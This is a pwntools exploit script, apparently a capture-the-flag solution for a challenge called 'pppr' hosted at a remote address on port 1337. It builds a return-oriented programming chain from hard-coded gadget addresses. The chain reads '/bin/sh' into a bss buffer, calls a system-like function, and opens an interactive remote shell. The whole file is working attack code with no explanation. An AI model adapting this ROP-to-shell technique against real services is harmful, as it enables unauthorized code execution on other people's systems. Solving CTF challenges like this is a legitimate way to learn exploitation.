#!/usr/bin/env python3

from pwn import *

#p = process("./pppr")
p = remote("pppr.sstf.site", 1337)
#context.log_level = 'debug'

ret = 0x08048376
gadget1 = 0x080485e7 # p1r
gadget2 = 0x080486a9 # p3r
x = 0x080485b4
r = 0x08048526
buf_in_bss = 0x0804a040
padding = "A" * 12

payload = padding.encode()
payload += p32(ret)
payload += p32(r)
payload += p32(gadget2)
payload += p32(buf_in_bss)
payload += p32(8)
payload += p32(0)
payload += p32(x)
payload += p32(0xdeadbeef)
payload += p32(buf_in_bss)

p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
